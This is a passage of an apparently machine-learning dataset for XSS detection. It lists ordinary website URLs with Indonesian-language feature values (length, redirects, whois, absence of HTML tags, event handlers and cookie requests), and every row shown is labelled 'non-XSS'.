75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.peugeot.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.planetqhe.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.plausiblefutures.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.playbill.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.polaris.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.policypublications.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.pontiac.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.popularmechanics.com/science/robotics/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.primerica.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.princeton.edu/~bayesway/ProbThink/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.prio.no/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.probabilitytheory.info/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.promed-financial.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.proto-mind.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.puyuanchem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.pwpa.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.qtww.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.quanlichem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.quaron.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.rayjurgen.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.readio.com/broadway/broadway1.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.reviewplays.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.rheinreport.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.robotcafe.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.roboticsindia.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.roboticspot.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.roboticstrends.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.robotshop.com/blog/en/robots/gorobotics;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.robotslife.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.robotsrule.com/phpBB2/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.russinoff.com/papers/gauss.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.saab.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.saliu.com/theory-of-probability.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.saperston.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.saturn.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.scene4.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.scenechanges.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.scientificamerican.com/article.cfm?id=augmented-reality-a-new-w;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.scs.leeds.ac.uk/cpde/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sen-dure.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.servenet.com/shoptalk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.servicentresystems.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.settheory.net/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sexarchive.info/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sexscience.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.shaga-group.com/shaga2000.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.shareholdervalue.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.shikoku.co.jp/eng/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.showbizradio.net/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.showbusinessweekly.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sieccan.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.siltechcorp.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sipri.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sit.edu/graduate/contact-program.cfm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.skarosser.se/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.smart.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.softpanorama.org/Algorithms/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.soygold.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.stage-directions.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.stagephoto.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.steppenwolf.org/ensemble/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sterling-group.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.stonetapert.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.successfulselfemployment.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sunlife.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sunsite.ubc.ca/DigitalMathArchive/Langlands/intro.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.sunworld.com.tw/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.suzuki.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.svb.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.talkinbroadway.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.tau.ac.il/humanities/philos/ai/links.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.teutoburgo.tk/java/otp4u.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.theatermania.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.theaterpro.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.theatreguidelondon.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.theatrenet.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.theatrepeople.com.au/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.theatre-reviews.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.thestage.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.thinkbigprogram.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.tinci.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.topix.com/business/financial-services;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML 